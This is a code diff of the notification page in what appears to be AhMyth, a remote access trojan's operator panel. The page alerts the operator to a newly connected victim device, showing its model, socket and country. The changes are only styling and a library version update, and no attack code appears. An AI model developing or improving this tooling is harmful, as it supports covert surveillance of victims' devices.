@@ -4,6 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no" />
+    <meta id="theme-source" name="theme" content="" />
 
     <title>AhMyth</title>
 
@@ -16,7 +17,7 @@
     </script>
 
 
-    <script type="text/javascript" src="assets/js/lib/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="assets/js/lib/jquery-3.7.1.min.js"></script>
     <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
     <script type="text/javascript" src="assets/js/controllers/NotifiCtrl.js"></script>
     <!-- Insert this line after script imports -->
@@ -24,37 +25,33 @@
         if (window.module) module = window.module;
     </script>
 
-    <link rel="stylesheet" href="css/mystyle.css">
+    <link rel="stylesheet" href="assets/css/mystyle.css">
     <link rel="stylesheet" href="../node_modules/fomantic-ui/dist/semantic.min.css" />
 
 
 </head>
 
-<body ng-controller="NotifiCtrl" class="nopadding">
-<audio autoplay>
-  <source src="Audio/AhMyth-notification.mp3" type="audio/mpeg">
-</audio>
-
-    <div class="ui cards">
-        <div class="red card">
+<body ng-controller="NotifiCtrl" class="nopadding dark">
+    <audio autoplay>
+        <source src="Audio/AhMyth-notification.mp3" type="audio/mpeg">
+    </audio>
+    <div class="bg ui cards">
+        <div class="red bg card">
             <div class="content">
                 <span class="right floated">
-                            <i  ng-if="victimCountry != null" class="{{victimCountry}} flag"></i>
-                            <i ng-if="victimCountry == null" class="help circle icon"></i>
-                        </span>
-                <div class="header" ng-bind="victimModel">
+                    <i ng-if="victimCountry != null" class="{{victimCountry}} flag"></i>
+                    <i ng-if="victimCountry == null" class="help circle icon"></i>
+                </span>
+                <div class="header bg" ng-bind="victimModel">
 
                 </div>
-                <div class="meta" ng-bind="victimSocket">
+                <div class="meta bg" ng-bind="victimSocket">
 
                 </div>
 
             </div>
         </div>
-
-
-
-
+    </div>
 </body>
 
 </html>
